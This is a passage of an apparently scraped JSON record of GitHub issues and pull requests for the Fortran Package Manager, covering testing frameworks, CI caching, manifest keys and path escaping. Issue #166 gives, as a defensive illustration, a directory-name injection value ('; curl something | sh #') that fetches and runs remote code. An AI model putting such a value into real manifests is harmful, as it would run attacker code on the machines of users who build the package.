mentioned.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGROTVUNT2WSW4USTLSGYODJANCNFSM4RR2MP5A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 19:40:22+00:00",
                    "text": "I think all doors should stay open. If we later decide to make the module naming more strict, we remove this test. If it shows to be problematic for implementation, we remove it. Adding this test doesn't close any doors."
                }
            ]
        },
        {
            "number": 177,
            "user": "awvwgk",
            "date": "2020-09-15 21:30:38+00:00",
            "title": "Allow selective testing of single suites and tests",
            "text": "Related to #176.\nIn case we want to continue using the current unit testing framework, this PR should reduce the boilerplate code to register new test suites and allow for some better debugging of failing tests.\nRegistering a new test suite works now in a similar way as registering a unit test in the collecting interface:\n\n  \n    \n      fpm/fpm/test/main.f90\n    \n    \n        Lines 15 to 19\n      in\n      4a5ecae\n    \n    \n    \n    \n\n        \n          \n           testsuite = [ & \n        \n\n        \n          \n               & new_testsuite(\"fpm_toml\", collect_toml), & \n        \n\n        \n          \n               & new_testsuite(\"fpm_manifest\", collect_manifest), & \n        \n\n        \n          \n               & new_testsuite(\"fpm_source_parsing\", collect_source_parsing) & \n        \n\n        \n          \n               & ] \n        \n    \n  \n\n\nThe other point is handling and debugging of failing tests.\nRunning fpm test will run all test suites and all contained unit tests. In case we encounter a failure, we usually don't want to run all tests every time while debugging, therefore I added the option to select the test suite and the test we want to run.\nThe available levels of testing are than:\n\nfpm test: no argument will run all available test suites\nfpm test --args \"help\" or any other not available test suite will print the names of all available test suites (will not run any tests and exit code will be 1)\n\n# Available testsuites\n# - fpm_toml\n# - fpm_manifest\n# - fpm_source_parsing\n\n\nfpm test --args \"fpm_source_parsing\" will select the source parsing test suite and only run its unit tests\nfpm test --args \"fpm_source_parsing help\" or any other not available unit test will print the names of all available unit tests in the test suite source parsing (will not run any tests and exit code will be 1)\n\n# Suite: fpm_source_parsing\n# Available tests:\n# - modules-used\n# - intrinsic-modules-used\n# - include-stmt\n# - module\n# - submodule\n# - submodule-ancestor\n# - subprogram\n# - csource\n# - invalid-use-stmt\n# - invalid-include-stmt\n# - invalid-module\n# - invalid-submodule\n\n\nfpm test --args \"fpm_source_parsing invalid-submodule\" will only run the invalid-submodule unit test from the source parsing test suite",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 18:13:42+00:00",
                    "text": "Thanks, @awvwgk. I have a few questions.\n\nDoes the argument value really need the quotes around it?\n\nfpm test --args \"help\"\n\nor does this work:\nfpm test --args help\n\nIf not, any way we can make it work without quotes? As is, the CLI UI seems a bit awkward to me.\n\nPerhaps the quotes are needed to pass multiple values to --args? I wonder if we need args at all. What do you think about this API instead:\n\nfpm test                                # runs all test suites\nfpm test fpm_source_parsing             # runs only this test suite\nfpm test missing_test_suite             # shows available test suites if missing test suite is requested\nfpm test test_suite_one, test_suite_two # list multiple suites separated by comma\nfpm test --help                         # shows the help message and the list of available test suites\nfpm test -h                             # same as above\n\nThis way we drop the --args and quotes altogether, IMO for a cleaner UI."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-18 19:02:42+00:00",
                    "text": "Regarding the first point, for a single argument it will work without quotes just fine. The reason for the quotation marks is mainly due to the limitation of the bootstrap fpm implementation, see #138. Therefore, I just put them around the arguments every time while testing (and writing the PR up).\nRegarding your suggestion at the second point, I guess there is some mix-up between the testing framework in fpm and the fpm-test target. Since we are building and testing fpm with fpm, this requires careful reading and writing, I hope I got the latter right.\n\nfpm test would invoke the test targets for fpm, which contain all executables contained in [[test]] sections\nfpm test fpm-test would invoke the fpm-test target defined for fpm (for fpm this is identical to 1.)\nfpm test test_source_parsing would be ambiguous, there is no target called test_source_parsing, in case there is only one test target available, we could allow fpm to be smart and pass it as argument to the one test target in fpm. I think this is rather dangerous, in case the test executable doesn't handle command line arguments it will fail silently.\nfpm test missing_test_suite is in this regard identical to 3.\nfpm test --help should print the help on the fpm test command, not pass this as argument to the test target.\n\nThe best solution would be to allow the -- flag in bootstrap fpm to pass every following argument to the selected target, currently we have to use --args \"<arg1> ...\" due to #138."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 19:14:51+00:00",
                    "text": "Okay, if I understood this correctly, I confused fpm's internal test suites with test targets that any fpm package can have. In that case, I'm happy with this moving forward as is."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:38:22+00:00",
                    "text": "This is a small and low impact PR with no objections so I'll go ahead and merge it. Thank you, @awvwgk!"
                }
            ]
        },
        {
            "number": 176,
            "user": "awvwgk",
            "date": "2020-09-15 21:19:49+00:00",
            "title": "Unit testing framework",
            "text": "I seems like we will stay with my (temporary) testing framework for now. I'm actually surprised that this idea worked out.\nNevertheless, we should discuss if there might be better alternatives or in case we want to stay with the current model, how it should behave as we implement more test suites. If we want to allow preprocessor or external (non-Fortran) dependencies we have a much wider range of testing frameworks available.\nRegarding the current behaviour of the testing framework:\n\none executable for all test suites to reduce [[test]] entries in fpm.toml (related to #164)\nfailing tests within a suite will not cause the testing to halt\n\nbetter overview in a CI run about errors\npotential for parallelisation over a test suite\n\n\na failing test suite will halt the testing framework\n\nnot sure about this one (any opinions or suggestions?)\nwill be changed by #177\n\n\narray constructor to register unit tests (and also test suites)\n\nname and procedure pointer required (could be redundant)\ncould become fragile for very large test suites (compiler limits for array constructors)",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-15 21:37:12+00:00",
                    "text": "I think your framework does exactly what we need and stays out of the way. Good to have this thread open for discussion, but unless concrete problems arise I don't think we need to look further for now."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-15 22:17:20+00:00",
                    "text": "I was going to suggest vegetables at some point, as it solves those problems. I also like it because it encourages the test descriptions to read more like a requirements specification. Your framework is actually fairly similar in terms of definition/registration of the tests, so I wasn't worried about switching, and if we do need to the transition won't seem very awkward. I also have a tool with it that automates finding all the test suites and constructing the main program.\n\na failing test suite will halt the testing framework\n\nI wouldn't recommend this. It makes the output of the framework dependent on the order that it runs the tests. If the tests are independent (and they should be), the order that they're run shouldn't have any bearing on the outputs.\n\ncould become fragile for very large test suites (compiler limits for array constructors)\n\nI've used vegetables for a project that had hundreds of tests. I don't know if fpm will have more than that, but it seems to me more likely to hit the continuation line limit before any array constructor limit (assuming there is one)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-16 08:46:17+00:00",
                    "text": "I'm happy with your framework since it's lightweight and easy to use as a developer.\nI will echo the general sentiment here that I prefer testing to continue in the presence of test failures - this is more useful when debugging IMO.\nI usually split test suites between multiple executables (hence #164) for two reasons:\n\nI can run tests in parallel trivially;\nUncaught fatal errors don't stop other suites from running (granted, we shouldn't have any uncaught failures here).\n\nWith that said, I don't mind the current single-executable approach since our tests don't have any significant runtime."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-16 09:00:53+00:00",
                    "text": "Agreed, a failing test suite should not stop the testing. I'll address this in #177."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-16 09:35:11+00:00",
                    "text": "In my Ftnunit unit test package I use a small batch file/shell script to\nrepeatedly run the test executable in case of run-time failures. It relies\non a small file being updated and read before each test to see if that test\nneeds to be run or has already been run. The problem is that if a test\nleads to a crash of the program, you simply cannot continue and this\nmechanism works around that.\n\nOp wo 16 sep. 2020 om 11:01 schreef Sebastian Ehlert <\nnotifications@github.com>:\n\u2026\n Agreed, a failing test suite should not stop the testing. I'll address\n this in #177 <#177>.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#176 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR6FY65K6RHDZTADFPTSGB5FLANCNFSM4RNZK6LQ>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-16 14:22:02+00:00",
                    "text": "In case of a test crashing we would have to run it with gdb or valgrind to debug anyway. This is not that straight-forward with fpm right now, but would probably use a similar mechanism as an external script to launch tests.\nWe could have something like the build-script in the library section to support more elaborated testing frameworks not only for this project but for all fpm packages:\n[[test]]\nname = \"tester\"\nbuild-script = \"collect-tests\"\ntest-script = \"run-tests\"\nfpm test would than call <test-script> <name> instead of just the binary."
                },
                {
                    "user": "certik",
                    "date": "2020-09-22 02:32:18+00:00",
                    "text": "I am ok with any testing framework for fpm itself. The current one is fine with me.\nAs long as fpm test works with any testing framework. I assume we all agree on that."
                }
            ]
        },
        {
            "number": 175,
            "user": "interkosmos",
            "date": "2020-09-15 19:06:31+00:00",
            "title": "Updated formatting",
            "text": "Please review these updates of README.md, CONTRIBUTING.md, and PACKAGING.md. Some minor changes in formatting and typography have been made.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-15 19:27:10+00:00",
                    "text": "Thanks, Philipp. I skimmed through and have no objections. To confirm, there are no content changes, right? If not, I think it can go forward."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-15 19:29:28+00:00",
                    "text": "Nope, no content changes."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-15 20:45:42+00:00",
                    "text": "Simple PR with no change to behavior or content so I will go ahead and merge."
                }
            ]
        },
        {
            "number": 174,
            "user": "LKedward",
            "date": "2020-09-13 10:49:55+00:00",
            "title": "Cache Haskell stack build in CI",
            "text": "Waiting up to 10min for the CI is a bit of a nuisance; especially when you rely on it for platforms you can't test yourself like MacOS.\nI've played around with actions/cache on my own fork to cache the Haskell stack build, and managed to drop CI times down to between 1min for Ubuntu and 3min for Windows, see this run for example.\n\n\nOn the first run, the CI will cache stack build files (in /home/runner/.stack/ on Ubuntu), and reuse this cache at subsequent CI runs.\n\n\nThe stack build command is still executed so any updates to Haskell fpm and its dependencies are still compiled each time.\n\n\nThe cache is reset:\n\nafter a week of no CI runs;\nif the STACK_CACHE_VERSION is changed manually in the workflow file;\nevery month otherwise.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-13 13:44:00+00:00",
                    "text": "Great idea! Looks good.\n\u2026\nOn Sun, Sep 13, 2020, at 4:50 AM, Laurence Kedward wrote:\n Waiting up to 10min for the CI is a bit of a nuisance; especially when\n you rely on it for platforms you can't test yourself like MacOS.\n\n I've played around with actions/cache\n <https://github.com/actions/cache> on my own fork to cache the Haskell\n stack build, and managed to drop CI times down to between 1min for\n Ubuntu and 3min for Windows, see this run for example\n <https://github.com/LKedward/fpm/runs/1106056906>.\n\n  * On the first run, the CI will cache stack build files (in\n `/home/runner/.stack/` on Ubuntu), and reuse this cache at subsequent\n CI runs.\n\n  * The `stack build` command is still executed so any updates to\n Haskell fpm and its dependencies are still compiled each time.\n\n  * The cache is reset:\n\n    * after a week of no CI runs;\n    * if the `STACK_CACHE_VERSION` is changed manually in the workflow file;\n    * every month otherwise.\n You can view, comment on, or merge this pull request online at:\n\n   #174\n\n Commit Summary\n\n  * Update: CI with caching of stack files.\n File Changes\n\n  * *M* .github/workflows/CI.yml\n <https://github.com/fortran-lang/fpm/pull/174/files#diff-128469c2fd54cf32412f10096b91495a> (28)\n Patch Links:\n\n  * https://github.com/fortran-lang/fpm/pull/174.patch\n  * https://github.com/fortran-lang/fpm/pull/174.diff\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#174>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGPEPCNQX4AYI4KY5LSFSPWBANCNFSM4RKS3U7Q>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:35:53+00:00",
                    "text": "@everythingfunctional Please merge when ready."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 07:13:44+00:00",
                    "text": "Another reason for this PR is that we get spurious CI failures when there's a lot of commit activity due to various rate limits being triggered. We can rerun the workflow, but again that adds to the lead time between push and CI result."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 15:05:21+00:00",
                    "text": "I am going to go ahead and merge. It is a huge improvement to development. If @everythingfunctional  objects later, we can revert this."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:49:38+00:00",
                    "text": "This is definitely a worthwhile change. Thanks."
                }
            ]
        },
        {
            "number": 173,
            "user": "urbanjost",
            "date": "2020-09-13 09:20:14+00:00",
            "title": "toml-f implementation produces error if more than 15 test or app programs are used",
            "text": "When using the Fortran TOML interface the program issues an error message when you have more than 15 test programs or application programs in a project.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-13 09:25:58+00:00",
                    "text": "Sorry, my mistake. Already fixed upstream in toml-f with ecbc73a. Will be made available with #171 in fpm."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-13 18:11:44+00:00",
                    "text": "Great. The only other problem I had was that I added description keywords in my fpm.toml files that were being used by the registry web page and the new TOML interface rejects unknown keywords. It looks like the problem with the description and category keywords is/was being taken care of (cannot find the topic but sure it was in here somewhere) but I have mixed feelings about that. It catches typos in the file but (like NAMELIST where I also dislike that) it makes it a lot harder to mainain a single file potentially used by multiple programs that might require different data. Is that intentional?  Great work by the way. Thanks!"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-13 18:37:33+00:00",
                    "text": "The new keywords came up in #165.\nIt was indeed intentional to have an explicit list of allowed keywords to verify the package file contains the correct entries and only the supported ones. I have to admit, I just extracted the allowed keys from the PACKAGING.md in this repository, which contains just several examples, chances were good that already supported keys would be missed and so they were.\nAn option would be to relax the check for allowed keys for certain sections or add a specific section that is not governed by any schema checks, see #165 (comment). I think the schema checks are especially useful in sections like library or the individual dependencies, which influence the way fpm is building a project."
                }
            ]
        },
        {
            "number": 172,
            "user": "urbanjost",
            "date": "2020-09-13 09:17:54+00:00",
            "title": "fpm should search in directories above current directory for fpm.toml file",
            "text": "I find the fpm(1) command much nicer to use if it searches for the fpm.toml file instead of requiring it to be executed in the directorin containing the fpm.toml file.  For example, if I am working on files in the src, app, and test directories and my current directory is one of those directories I have to cd(1) up one directory and run fpm(1) and then cd back into the working directory or stay in the directory with the fpm.toml file and use long path names. I have been trying that with a personal version and it makes it MUCH nicer to use on larger projects with many directories, especially since each executable source has to be kept in a seperate directory.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-13 10:19:27+00:00",
                    "text": "I like this idea! I have noticed the same thing while working with fpm, having to switch back and forth between two terminal panes when building. This is also exactly how git(1) works.\n\n... especially since each executable source has to be kept in a seperate directory.\n\nThere is discussion in #164 (Automatically discover tests and executables) to remove this restriction and further simplify user-effort."
                }
            ]
        },
        {
            "number": 171,
            "user": "awvwgk",
            "date": "2020-09-12 20:56:18+00:00",
            "title": "Increase test coverage of fpm manifest",
            "text": "should yield complete coverage for all reachable lines in manifest modules (total test coverage at ~78%)\ninfo procedures of the manifest types are not tested\nadds description, keywords, categories and homepage to allowed keys in root (see #165)\nfixes revision -> rev in dependency table\nfixes path not excluding tag, rev and branch entry\nfixes grammar of error messages\nbump commit to latest toml-f version (doesn't require class(toml_table), pointer anymore, bugfixes)\ninclude test number in fpm-test runs\n\nQuestion: Do we want keep the info procedures for the manifest types? I added them for debugging in the first implementation.\nFixes #173",
            "comments": []
        },
        {
            "number": 170,
            "user": "LKedward",
            "date": "2020-09-12 15:01:56+00:00",
            "title": "Source parsing tests",
            "text": "As discussed in #155, this uses the error_t type to return and propagate errors from the new source parsing routines.\nAdds a test suite for the parsing routines - any difficult parsing edge cases can be added in there as they are found.\nThere are other regions from #155 that still require test coverage.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-12 18:26:56+00:00",
                    "text": "Thanks @awvwgk \ud83d\udc4d\n\n.. it might be more verbose to print the line of the source file as well, maybe, in case we know, even highlight the offending part in some way.\n\nGreat idea! That's a neat implementation too!\nI've now added more context output, though in most cases indicating the offending column may have to wait until a proper parsing library is used."
                }
            ]
        },
        {
            "number": 169,
            "user": "awvwgk",
            "date": "2020-09-12 11:29:56+00:00",
            "title": "Packaging license files with fpm",
            "text": "Since fpm is built around the sole purpose of linking Fortran dependencies statically into applications, there should be a mechanism do deal with license files. Currently the specified license only takes a string or maybe SPDX identifier, but this might not be sufficient for some projects, e.g. packaging for conda-forge requires to package the project license files and all license files of the statically linked dependencies.\nRequiring every project to specify the license with an SPDX identifier and either let fpm automatically collect the license files (look for COPYING*, LICENSE*, ... in the project root directory) or require the author to provide a list of license files would allow fpm to know about the more or less exact licensing situation of the application.\nThis affects packages under multiple licenses as well, the Apache-2.0 / MIT dual licensing from the Rust community is probably relevant here.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-12 16:28:40+00:00",
                    "text": "Why do we want to do this?\nIs it to safeguard the user from inadvertently importing a less permissive dependency into their project, for example, GPL dependency into a MIT project? In that case, do we want to not allow it or simply warn the user? What does Cargo do in this scenario?\nAre there other reasons to handle dependency licenses?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-12 17:12:26+00:00",
                    "text": "Most licenses require to be included with source or binary distributions in some form. I think this becomes important once we start creating distributions of any kind with fpm. But I can only speak about the projects I'm usually packaging for.\nIf fpm should support producing conda-build input like suggested in #70, it would be certainly necessary. Packing the license files is a requirement to publish on conda-forge (see https://conda-forge.org/docs/maintainer/adding_pkgs.html).\nPackaging for Arch Linux requires the inclusion of the license files as well (see https://wiki.archlinux.org/index.php/PKGBUILD#license).\nI also checked Cargo and it requires either SPDX identifiers or the license file(s) to be packaged (see https://doc.rust-lang.org/cargo/reference/manifest.html#the-license-and-license-file-fields)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-12 17:29:26+00:00",
                    "text": "Thank you for further explaining that, I now understand better. It seems like the right thing to do."
                },
                {
                    "user": "certik",
                    "date": "2020-09-12 17:55:43+00:00",
                    "text": "Yes, I think we have to package the license.\n\u2026\nOn Sat, Sep 12, 2020, at 11:29 AM, Milan Curcic wrote:\n\n\n Thank you for further explaining that, I now understand better. It\n seems like the right thing to do.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#169 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWBLSDIBATGERB7DXATSFOVYHANCNFSM4RJM47GA>."
                }
            ]
        },
        {
            "number": 168,
            "user": "interkosmos",
            "date": "2020-09-10 18:25:26+00:00",
            "title": "Fortran interface bindings to libgit2",
            "text": "I\u2019d like to announce that I\u2019m working on a collection of Fortran 2008 ISO C binding interfaces to libgit2, as this dependency was discussed in #136 and #166. Just in case anybody else has the same idea.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-10 18:41:25+00:00",
                    "text": "Awesome, thank you @interkosmos !"
                }
            ]
        },
        {
            "number": 167,
            "user": "awvwgk",
            "date": "2020-09-08 08:12:52+00:00",
            "title": "Special characters in paths",
            "text": "I found this setting up challenging tests for #155, but it is also not working in bootstrap fpm as well.\nConsider a project like this\n.\n\u251c\u2500\u2500 app dir\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main prog.f90\n\u251c\u2500\u2500 app\"dir\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main\"prog.f90\n\u251c\u2500\u2500 app'dir\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main'prog.f90\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 source dir\n    \u2514\u2500\u2500 escape_m.f90\n\nOf course, projects with such a structure are usually discouraged, but obviously not forbidden.\nThe fpm.toml for such a project would look like:\nname = \"escape chars\"\n\n[library]\nsource-dir = \"source dir\"\n\n[[executable]]\nname = \"with spaces\"\nsource-dir = \"app dir\"\nmain = \"main prog.f90\"\n\n[[executable]]\nname = \"single'quotes\"\nsource-dir = \"app'dir\"\nmain = \"main'prog.f90\"\n\n[[executable]]\nname = \"double\\\"quotes\"\nsource-dir = \"app\\\"dir\"\nmain = \"main\\\"prog.f90\"\nAnd it is indeed a valid TOML document. But building with bootstrap fpm will fail due to spaces in the project name:\n> fpm build\n# ar (for build/gfortran_debug/escape chars/libescape chars.a)\nar: creating build/gfortran_debug/escape\nar: chars/libescape: No such file or directory\nfpm: Error when running Shake build system:\n  at want, called at src/Build.hs:205:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_debug/escape chars/libescape chars.a\n  at cmd, called at src/Build.hs:204:13 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Raised the exception:\nDevelopment.Shake.cmd, system command failed\nCommand line: ar rs build/gfortran_debug/escape chars/libescape chars.a 'build/gfortran_debug/escape chars/escape_m.o'\nExit code: 1\nStderr:\nar: creating build/gfortran_debug/escape\nar: chars/libescape: No such file or directory\n\nProbably escape-chars is a better project name, but we still cannot run the executables:\nfpm run with\\ spaces\n/bin/sh: /home/awvwgk/projects/src/github.com/fortran-package-manager/test/example_packages/escape-chars/build/gfortran_debug/app: No such file or directory\n\nA complete version of this package is here:  escape-chars.zip.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-08 12:11:13+00:00",
                    "text": "I'll look into this with #155. I don't think double quotes are allowed for directories or files in Windows, so perhaps we should simply not support them at all - this would also make sanitization of command line execution easier as well I think (#166)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-08 16:26:52+00:00",
                    "text": "Fixing the creation of the archive was actually a simple change:\ndiff --git a/bootstrap/src/Build.hs b/bootstrap/src/Build.hs\nindex ffbf264..7eb9338 100644\n--- a/bootstrap/src/Build.hs\n+++ b/bootstrap/src/Build.hs\n@@ -201,7 +201,7 @@ buildLibrary libraryDirectory sourceExtensions buildDirectory compiler flags lib\n           archiveFile %> \\a -> do\n             let objectFiles = Map.keys sourceFileLookupMap\n             need objectFiles\n-            cmd \"ar\" [\"rs\"] a objectFiles\n+            cmd \"ar\" [\"rs\"] [a] objectFiles\n           want [archiveFile]\n     return archiveFile\n \nUnfortunately, I'm not yet there for the executables. They are found correctly in bootstrap fpm, but the shell invocation is not escaping them:\n\n  \n    \n      fpm/bootstrap/src/Fpm.hs\n    \n    \n        Lines 153 to 154\n      in\n      cd10478\n    \n    \n    \n    \n\n        \n          \n           system \n        \n\n        \n          \n           (map (++ \" \" ++ commandArguments args) canonicalExecutables) \n        \n    \n  \n\n\n\n  \n    \n      fpm/bootstrap/src/Fpm.hs\n    \n    \n        Lines 187 to 188\n      in\n      cd10478\n    \n    \n    \n    \n\n        \n          \n           system \n        \n\n        \n          \n           (map (++ \" \" ++ commandArguments args) canonicalExecutables) \n        \n    \n  \n\n\nI will toy around with the Haskell implementation until I can figure this part out as well. Some pointers from the Haskell programmers around are of course appreciated."
                }
            ]
        },
        {
            "number": 166,
            "user": "awvwgk",
            "date": "2020-09-07 20:20:20+00:00",
            "title": "Security of execute_command_line",
            "text": "Since we are using execute_command_line quite a lot in Fortran fpm right now, we should think about a safe alternative for all external command invokations or a way to harden the input to execute_command_line against exploits.\nInjecting bash code with directory names from fpm.toml using something like '; curl something | sh #' would be one example to exploit the current way we are handling directory names. And '; curl something | sh #' happens to be a perfectly fine directory name on Unix systems.\nAs this projects matures a security policy regarding those issues is needed to avoid having exploits discussed publicly in an issue.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 15:05:33+00:00",
                    "text": "Eventually we should be able to not resort to execute_command_line at all.\n\nFor file system operations, we'll be able to use stdlib_os which is slated to become part of stdlib;\nFor git, we should interface libgit2.\nFor getting any other stuff from the web, we should interface curl, @interkosmos has Fortran bindings here.\n\nIn the interim, I think it's okay to be less safe in favor of prototyping."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-10 08:34:30+00:00",
                    "text": "Eventually we should be able to not resort to execute_command_line at all.\n\nDoes this include execution of compiler commands as well?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-10 11:33:30+00:00",
                    "text": "I forgot about the compilers.. :)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-10 13:27:01+00:00",
                    "text": "My understanding is that typical security practices are to identify all user input, and ensure that it is sanitized immediately upon being read in. It's also important to have some understanding of the attack vectors you're trying to protect against. It's more about where the data comes from than the just the call to execute_command_line. For example execute_command_line(\"find ./ -name '*.f90'\") is perfectly safe, but execute_command_line(\"find ./ -name '*.\" // fortran_extension // \"'\") would not be safe if fortran_extension comes from user input.\nI'm guessing the main attack vector we're trying to protect against is a malicious fpm.toml. Conceivably, someone could put malicious code in an fpm.toml and publicize that package. Anyone listing that package as a dependency would execute the malicious code simply by building their package. So, anything being read from fpm.toml needs to be checked to make sure it is safe.\nHowever, there is an attack vector that I'm not sure we can reasonably protect against; malicious Fortran code in a package. It will always be the responsibility of users of a package to verify that it does not contain malicious Fortran code; especially if using a package not in the official registry. By the time code is fed to the compiler or makes it into an executable, fpm is not what's executing it, and can't really do anything about it."
                },
                {
                    "user": "certik",
                    "date": "2020-09-10 21:27:49+00:00",
                    "text": "Also the way fpm is designed (after #155 is merged) is that the front-end parses all user input and must ensure that nothing malicious happens, and then populates the model. We should ensure that the model does not contain anything malicious. After that it is the job of the backend to properly execute the build."
                }
            ]
        },
        {
            "number": 165,
            "user": "LKedward",
            "date": "2020-09-07 16:41:55+00:00",
            "title": "Support registry meta-data fields in manifest",
            "text": "Now that we have fpm-registry I think we should add official support for various meta-data fields in the fpm.toml manifest including description, keywords, categories, and homepage.\nLooking to cargo as an example, it requires the following fields before a crate can be published.\nChecking and validating the fields is a job for the fpm-registry CI, this issue is just to enable support within fortran fpm.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 18:49:32+00:00",
                    "text": "It would require a schema definition or at least any kind of documentation what is allowed in a package manifest, description is actually missing in the PACKAGING.md, which I took as reference for the allowed keys.\nAlso the two available implementation follow very different strategies. The boostrap implementation ignores everything except the needed keys, while the Fortran implementation does not allow anything except the keys hardcoded in the executable."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-12 09:30:10+00:00",
                    "text": "I think adding all those keywords to the toplevel might overload the package file a bit, having additional sections for meta information would probably be best, e.g. conda-build is using about. We could support an extra section as well, which is not governed by any schema and allows to test new sections or keys."
                }
            ]
        },
        {
            "number": 164,
            "user": "LKedward",
            "date": "2020-09-07 11:06:47+00:00",
            "title": "Automatically discover executables & tests",
            "text": "Currently you are required to explicitly specify each test and executable in the fpm manifest file.\nThis is a lot of manual work and can lead to overly-verbose manifests (see M_system for example).\nI don't think this is necessary for implementation and I would rather have executables and tests in the default locations to be discovered automatically. Is this not how cargo does it?\nThe existing [[test]] and [[executable]] entries can be retained for specifying custom settings for individual executables & tests.\nI believe this behaviour was mentioned in #105 (comment) and is also related to #91.\nThis is very easy to implement in the fortran implementation from #155; the implementation already discovers all programs, but currently filters out those not specified in fpm.toml in order to match existing behaviour.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-08 18:31:58+00:00",
                    "text": "I'd be okay with making some changes to the \"default\" functionality, so long as the following are satisfied:\n\nIt can be easily explained to a user without many (any?) caveats and exceptions\nIt is possible to achieve exactly the same functionality when explicitly declared in fpm.toml\nIt doesn't encourage bad practices (granted that may be fairly subjective)\n\nFor example, implicit none requires the programmer to be more explicit, and involves more work, but is at this point pretty universally considered to be best practice (i.e. would be considered bad practice not to include it).\nFor me, having multiple programs and modules in one directory would be \"bad practice\", because for someone trying to understand your project, it is no longer clear which files are programs and which are modules, or which modules are used by which programs, at least not without opening and reading each file.\nI would be ok with having multiple programs in a single directory provided there are no modules in that directory. But I do struggle a bit with what it would look like to specify that in fpm.toml.\nI would also be ok with having multiple programs in separate folders being detected automatically, but I struggle a bit with what folders it should look in? Maybe just subdirectories of the app folder?\nSo with those ideas, we effectively end up with 3 possible \"default\" fpm.toml specifications.\n\nA single [[executable]] entry with app as the directory and main.f90 as the file\nSomehow specifying app as a directory containing multiple programs\nMultiple [[executable]] entries (1 for each subdirectory of app)\n\nThere are then multiple \"error\" conditions that must be checked, with some being unclear as to what the user might have expected to happen.\n\nWhat if multiple programs and 1 or more modules are found in the app folder?\nWhat if there is a file app/main.f90 and subdirectories of app?\n\nI'm open to ideas, these are just some of my concerns."
                },
                {
                    "user": "certik",
                    "date": "2020-09-08 18:40:43+00:00",
                    "text": "I think we should do it like Cargo does it, which is to agree on a standard layout and as long as you follow it, you don't have to specify anything in fpm.toml. Here is the Cargo's layout: https://doc.rust-lang.org/cargo/guide/project-layout.html\nSo we will have app/program1.f90 and app/program2.f90 to be two single file executables, and for multi file executables we will have subdirectories of app. The same layout that Cargo is doing, only instead of src/bin, we have app."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-08 19:47:44+00:00",
                    "text": "I think the Cargo way does make for a decently easy to understand and describe usage, although it does make explicit specification in fpm.toml more complicated, and complicates (for me at least) the most common use case, where I've got one (test) program with multiple modules. This would require me to put them in a subdirectory of app (or test) even though I've only got one. Not a big deal, just worth mentioning.\nI'd be curious to see what it would look like to specify additional details (compiler flags, link flags, etc.) for specific tests or executables as well. I'm not opposed to doing it this way, I'd just like to see some examples before we make a decision."
                },
                {
                    "user": "certik",
                    "date": "2020-09-08 20:24:24+00:00",
                    "text": "@everythingfunctional can you show an example project where you have one test program with multiple modules that you only want to be part of this test program and not the library (in src)?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-09 02:53:44+00:00",
                    "text": "That's how my testing framework works. All of the tests are written in modules, and all of the tests are run via a single executable. And so all of my libraries' tests are written that way."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-09 09:07:38+00:00",
